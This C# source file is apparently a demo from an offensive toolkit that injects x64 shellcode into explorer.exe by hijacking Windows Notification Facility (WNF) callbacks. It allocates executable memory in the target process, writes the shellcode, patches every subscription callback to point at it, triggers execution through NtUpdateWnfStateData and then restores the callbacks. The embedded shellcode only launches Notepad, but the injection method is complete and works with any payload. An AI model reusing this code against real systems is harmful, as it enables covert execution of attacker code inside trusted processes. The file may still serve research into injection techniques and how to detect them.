using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using WNFuck.Common.Interop;
using WNFuck.Common.Interop.NativeConsts;
using WNFuck.Common.WNF.Defines;
using WNFuck.Common.WNF.PeProcess;

namespace BasicDemo_Injection
{
    internal class WNFuck
    {
        static void Main(string[] args)
        {

            //// x64 NOTEPAD.EXE
            byte[] shellcode = new byte[] { 0x48, 0x8b, 0xc4, 0x48, 0x83, 0xec, 0x48, 0x48, 0x8d, 0x48, 0xd8, 0xc7, 0x40, 0xd8, 0x57, 0x69, 0x6e, 0x45, 0xc7, 0x40, 0xdc, 0x78, 0x65, 0x63, 0x00, 0xc7, 0x40, 0xe0, 0x6e, 0x6f, 0x74, 0x65, 0xc7, 0x40, 0xe4, 0x70, 0x61, 0x64, 0x00, 0xe8, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0c, 0xba, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x28, 0xff, 0xd0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x48, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x63, 0x41, 0x3c, 0x48, 0x8b, 0xd9, 0x4c, 0x8b, 0xe2, 0x8b, 0x8c, 0x08, 0x88, 0x00, 0x00, 0x00, 0x85, 0xc9, 0x74, 0x37, 0x48, 0x8d, 0x04, 0x0b, 0x8b, 0x78, 0x18, 0x85, 0xff, 0x74, 0x2c, 0x8b, 0x70, 0x1c, 0x44, 0x8b, 0x70, 0x20, 0x48, 0x03, 0xf3, 0x8b, 0x68, 0x24, 0x4c, 0x03, 0xf3, 0x48, 0x03, 0xeb, 0xff, 0xcf, 0x49, 0x8b, 0xcc, 0x41, 0x8b, 0x14, 0xbe, 0x48, 0x03, 0xd3, 0xe8, 0x87, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x25, 0x85, 0xff, 0x75, 0xe7, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0xc3, 0x0f, 0xb7, 0x44, 0x7d, 0x00, 0x8b, 0x04, 0x86, 0x48, 0x03, 0xc3, 0xeb, 0xd4, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x20, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xf9, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0x50, 0x18, 0x48, 0x8b, 0x5a, 0x10, 0xeb, 0x16, 0x4d, 0x85, 0xc0, 0x75, 0x1a, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xc8, 0xe8, 0x35, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x1b, 0x4c, 0x8b, 0xc0, 0x48, 0x8b, 0x43, 0x30, 0x48, 0x85, 0xc0, 0x75, 0xe1, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x49, 0x8b, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x44, 0x8a, 0x01, 0x45, 0x84, 0xc0, 0x74, 0x1a, 0x41, 0x8a, 0xc0, 0x48, 0x2b, 0xca, 0x44, 0x8a, 0xc0, 0x3a, 0x02, 0x75, 0x0d, 0x48, 0xff, 0xc2, 0x8a, 0x04, 0x11, 0x44, 0x8a, 0xc0, 0x84, 0xc0, 0x75, 0xec, 0x0f, 0xb6, 0x0a, 0x41, 0x0f, 0xb6, 0xc0, 0x2b, 0xc1, 0xc3 };

            WELL_KNOWN_WNF_NAME targetStateName = WELL_KNOWN_WNF_NAME.WNF_SHEL_CHAT_ICON_BADGE; // RW privileges, SESSION


            string processName = "EXPLORER";
            Process proc = null;
            PeProcess peProc = null;

            Console.WriteLine($"[+] Trying to spawn a NOTEPAD.EXE in {processName}\n");

            // Find the process by name and get first occurrence
            try
            {
                proc = PeUtils.GetProcessByName(processName);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return;
            }

            // Get the PeProcess object, used to parse the process memory
            // You may need SeDebugPrivilege for high privilege processes
            // Explorer should be just fine
            try
            {
                peProc = new PeProcess(proc.Id);
            }
            catch (ArgumentException ex)
            {
                Console.WriteLine($"[!] Could not open specified process.");
                return;
            }
            catch (KeyNotFoundException ex)
            {
                Console.WriteLine("[!] Failed to open the specified process.");
                return;
            }
            catch (Win32Exception ex)
            {
                Console.WriteLine($"[!] Failed to open the specified process. {ex.Message}");
                return;
            }

            // Assuming x64
            using (peProc) // Dispose it at the end
            {
                #region _WNF_SUBSCRIPTION_TABLE
                // Find subscription table by iterating heap
                // and looking for NodeTypeCode 0x911
                IntPtr pSubscriptionTable = PeUtils.GetSubscriptionTablePtr(peProc);
                if (pSubscriptionTable == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get valid WNF_SUBSCRIPTION_TABLE.");
                    return;
                }
                Console.WriteLine($"[+] Subscription table at 0x{pSubscriptionTable.ToString("X16")}");

                // Get the _WNF_SUBSCRIPTION_TABLE struct
                var subscriptionTable = PeUtils.PtrToSubscriptionTable(peProc, pSubscriptionTable);
                #endregion

                #region _WNF_NAME_SUBSCRIPTION root
                uint nNameTableEntryOffset;
                IntPtr pNameSubscription;

                nNameTableEntryOffset = (uint)Marshal.OffsetOf(
                    typeof(WNF_NAME_SUBSCRIPTION64_WIN11),
                    "NamesTableEntry").ToInt32();

                // NamesTableEntry->Root does not point to the beginning of a _WNF_NAME_SUBSCRIPTION,
                // but instead it points to the NamesTableEntry property, so we need to substract the offset
                pNameSubscription = new IntPtr(subscriptionTable.NamesTableEntry.Root - nNameTableEntryOffset);
                var nameSubscriptionRoot = PeUtils.PtrToNameSubscription(peProc, pNameSubscription);
                Console.WriteLine($"[+] Root Name Subscription at 0x{pNameSubscription.ToString("X16")}");
                #endregion

                #region List NameSubscriptions
                Dictionary<WELL_KNOWN_WNF_NAME, IntPtr> nameSubscriptions = new Dictionary<WELL_KNOWN_WNF_NAME, IntPtr>();

                // Walks the Red-Black Tree filling the list of NameSubscriptions
                PeUtils.ListWin11NameSubscriptions(peProc, pNameSubscription, ref nameSubscriptions);
                #endregion

                #region Get UserSubscriptions for targetStateName
                pNameSubscription = nameSubscriptions[targetStateName];

                var userSubscriptions = PeUtils.GetUserSubscriptionsFromNameSubscription(peProc, pNameSubscription);

                Console.WriteLine();
                Console.WriteLine($"[+] {targetStateName} @ 0x{pNameSubscription.ToString("X16")}");
                #endregion

                #region Injection

                // Allocate memory for shellcode
                IntPtr pShellcode = NativeAPI.VirtualAllocEx(peProc.GetProcessHandle(), IntPtr.Zero, (uint)shellcode.Length, MemoryAllocationFlags.MEM_COMMIT | MemoryAllocationFlags.MEM_RESERVE, MemoryProtectionFlags.PAGE_EXECUTE_READ);
                if (pShellcode == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Could not allocate space for shellcode!");

                    return;
                }

                // Write shellcode in allocated RX region
                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                if (!peProc.WriteBytes(pShellcode, shellcode))
                {
                    Console.WriteLine("[!] Could not write shellcode in memory!");

                    return;
                }
                else
                {
                    Console.WriteLine($"\t-> Shellcode @ {pShellcode.ToString("X16")}");
                }

                // Patch all User Subscriptions
                foreach (var userSub in userSubscriptions)
                {
                    Console.WriteLine($"\t-> Callback @ 0x{userSub.Value.Callback.ToString("X16")} | Context @ 0x{userSub.Value.CallbackContext.ToString("X16")}");
                    IntPtr resultCallback = PeUtils.PatchUserSubscriptionCallback(peProc, userSub.Key, pShellcode, IntPtr.Zero);
                    Console.WriteLine($"\t\t-> New Callback @ 0x{resultCallback.ToString("x16")}");
                }
                #endregion

                Console.WriteLine("[+] Callbacks ready. Press any key to publish the trigger!");
                Console.ReadLine();

                #region Triggering
                var res = NativeAPI.NtUpdateWnfStateData(targetStateName, null, 0, IntPtr.Zero, IntPtr.Zero, 0, 0);
                if (res != 0)
                {
                    Console.WriteLine("[!] Could not trigger WNF callback!");
                    return;
                }
                #endregion

                Console.WriteLine("[+] Injection finished. Press any key for cleanup.");
                Console.ReadLine();

                #region Cleanup
                // Release allocated region
                NativeAPI.VirtualFreeEx(peProc.GetProcessHandle(), pShellcode, 0, MemoryAllocationFlags.MEM_RELEASE);

                // Restore original callbacks
                foreach (var userSub in userSubscriptions)
                {
                    Console.WriteLine($"\t-> Restoring Callback @ 0x{userSub.Value.Callback.ToString("X16")} | Context @ 0x{userSub.Value.CallbackContext.ToString("X16")}");
                    IntPtr resultCallback = PeUtils.PatchUserSubscriptionCallback(peProc, userSub.Key, userSub.Value.Callback, IntPtr.Zero);
                    Console.WriteLine($"\t\t-> Callback Restored @ 0x{resultCallback.ToString("x16")}");
                }

                peProc.Dispose();
                #endregion

                Console.WriteLine("[+] Cleanup finished. Press any key to exit.");
                Console.ReadLine();
            }
        }
    }
}
